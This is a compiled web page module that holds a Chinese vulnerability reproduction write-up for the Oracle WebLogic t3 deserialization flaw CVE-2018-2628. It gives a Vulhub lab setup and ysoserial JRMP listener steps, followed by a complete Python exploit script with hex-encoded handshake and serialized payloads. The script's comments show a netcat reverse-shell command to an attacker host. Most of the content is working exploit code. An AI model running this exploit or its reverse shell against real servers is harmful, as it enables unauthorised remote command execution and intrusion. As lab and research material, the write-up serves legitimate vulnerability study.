import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as c,o,c as i,a as n,b as s,d as e,e as t}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。",-1),d=n("p",null,"参考链接：",-1),k={href:"http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html",target:"_blank",rel:"noopener noreferrer"},m={href:"http://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA",target:"_blank",rel:"noopener noreferrer"},f={href:"https://github.com/tdy218/ysoserial-cve-2018-2628",target:"_blank",rel:"noopener noreferrer"},v=t(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动Weblogic 10.3.6.0：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>等待环境启动（环境差异，有的机器可能等待的时间比较久），访问<code>http://your-ip:7001/console</code>，初始化整个环境。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021703212.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先下载ysoserial，并启动一个JRMP Server：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其中，<code>[command]</code>即为我想执行的命令，而<code>[listen port]</code>是JRMP Server监听的端口。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021715675.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,10),b={href:"https://www.exploit-db.com/exploits/44553",target:"_blank",rel:"noopener noreferrer"},_=n("code",null,"http://your-ip:7001",-1),y=t(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其中，<code>[victim ip]</code>和<code>[victim port]</code>是目标weblogic的IP和端口，<code>[path to ysoserial]</code>是本地ysoserial的路径，<code>[JRMPListener ip]</code>和<code>[JRMPListener port]</code>第一步中启动JRMP Server的IP地址和端口。<code>[JRMPClient]</code>是执行JRMPClient的类，可选的值是<code>JRMPClient</code>或<code>JRMPClient2</code>。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021717576.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>exploit.py执行完成后，执行<code>docker-compose exec weblogic bash</code>进入容器中，可见/tmp/awesome_poc已成功创建。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021716478.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token comment"># Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)</span>
<span class="token comment">#</span>
<span class="token comment"># IMPORTANT: Is provided only for educational or information purposes.</span>
<span class="token comment">#</span>
<span class="token comment"># Credit: Thanks by Liao Xinxi of NSFOCUS Security Team</span>
<span class="token comment"># Reference: http://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</span>
<span class="token comment">#</span>
<span class="token comment"># How to exploit:</span>
<span class="token comment"># 1. run below command on JRMPListener host</span>
<span class="token comment">#    1) wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span>
<span class="token comment">#    2) java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</span>
<span class="token comment">#       e.g. java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#39;nc -nv 10.0.0.5 4040&#39;</span>
<span class="token comment"># 2. start a listener on attacker host</span>
<span class="token comment">#    e.g. nc -nlvp 4040</span>
<span class="token comment"># 3. run this script on attacker host</span>
<span class="token comment">#    1) wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span>
<span class="token comment">#    2) python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</span>
<span class="token comment">#       e.g.</span>
<span class="token comment">#           a) python exploit.py 10.0.0.11 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 10.0.0.5 1099 JRMPClient (Using java.rmi.registry.Registry)</span>
<span class="token comment">#           b) python exploit.py 10.0.0.11 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 10.0.0.5 1099 JRMPClient2 (Using java.rmi.activation.Activator)</span>

<span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function

<span class="token keyword">import</span> binascii
<span class="token keyword">import</span> os
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> time


<span class="token keyword">def</span> <span class="token function">generate_payload</span><span class="token punctuation">(</span>path_ysoserial<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span> jrmp_listener_port<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#generates ysoserial payload</span>
    command <span class="token operator">=</span> <span class="token string">&#39;java -jar {} {} {}:{} &gt; payload.out&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path_ysoserial<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span> jrmp_listener_port<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;command: &quot;</span> <span class="token operator">+</span> command<span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
    bin_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#39;payload.out&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;rb&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>bin_file<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">t3_handshake</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> server_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span>
    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;hex&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;handshake successful&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">build_t3_request_object</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    data1 <span class="token operator">=</span> <span class="token string">&#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39;</span>
    data2 <span class="token operator">=</span> <span class="token string">&#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">&#39;{:04x}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>dport<span class="token punctuation">)</span><span class="token punctuation">)</span>
    data3 <span class="token operator">=</span> <span class="token string">&#39;1a7727000d3234322e323134&#39;</span>
    data4 <span class="token operator">=</span> <span class="token string">&#39;2e312e32353461863d1d0000000078&#39;</span>
    <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token punctuation">[</span>data1<span class="token punctuation">,</span>data2<span class="token punctuation">,</span>data3<span class="token punctuation">,</span>data4<span class="token punctuation">]</span><span class="token punctuation">:</span>
        sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>d<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;hex&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;send request payload successful,recv length:%d&#39;</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">send_payload_objdata</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload<span class="token operator">=</span><span class="token string">&#39;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#39;</span>
    payload<span class="token operator">+=</span>data
    payload<span class="token operator">+=</span><span class="token string">&#39;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#39;</span>
    payload <span class="token operator">=</span> <span class="token string">&#39;%s%s&#39;</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token string">&#39;{:08x}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;hex&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;hex&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            res <span class="token operator">+=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">return</span> res


<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>dip<span class="token punctuation">,</span> dport<span class="token punctuation">,</span> path_ysoserial<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span> jrmp_listener_port<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">)</span>
    server_addr <span class="token operator">=</span> <span class="token punctuation">(</span>dip<span class="token punctuation">,</span> dport<span class="token punctuation">)</span>
    t3_handshake<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> server_addr<span class="token punctuation">)</span>
    build_t3_request_object<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> dport<span class="token punctuation">)</span>
    payload <span class="token operator">=</span> generate_payload<span class="token punctuation">(</span>path_ysoserial<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span> jrmp_listener_port<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;payload: &quot;</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>
    rs<span class="token operator">=</span>send_payload_objdata<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;response: &#39;</span> <span class="token operator">+</span> rs<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;exploit completed!&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    <span class="token comment">#check for args, print usage if incorrect</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">7</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;\\nUsage:\\nexploit.py [victim ip] [victim port] [path to ysoserial] &#39;</span>
              <span class="token string">&#39;[JRMPListener ip] [JRMPListener port] [JRMPClient]\\n&#39;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

    dip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    dport <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    path_ysoserial <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
    jrmp_listener_ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>
    jrmp_listener_port <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>
    jrmp_client <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>
    exploit<span class="token punctuation">(</span>dip<span class="token punctuation">,</span> dport<span class="token punctuation">,</span> path_ysoserial<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span> jrmp_listener_port<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,7);function g(h,x){const a=c("ExternalLinkIcon");return o(),i("div",null,[u,r,d,n("ul",null,[n("li",null,[n("a",k,[s("http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html"),e(a)])]),n("li",null,[n("a",m,[s("http://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA"),e(a)])]),n("li",null,[n("a",f,[s("https://github.com/tdy218/ysoserial-cve-2018-2628"),e(a)])])]),v,n("p",null,[s("然后，使用"),n("a",b,[s("exploit.py"),e(a)]),s("脚本（注意在python2环境下），向目标Weblogic（"),_,s("）发送数据包：")]),y])}const P=p(l,[["render",g],["__file","Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628.html.vue"]]);export{P as default};
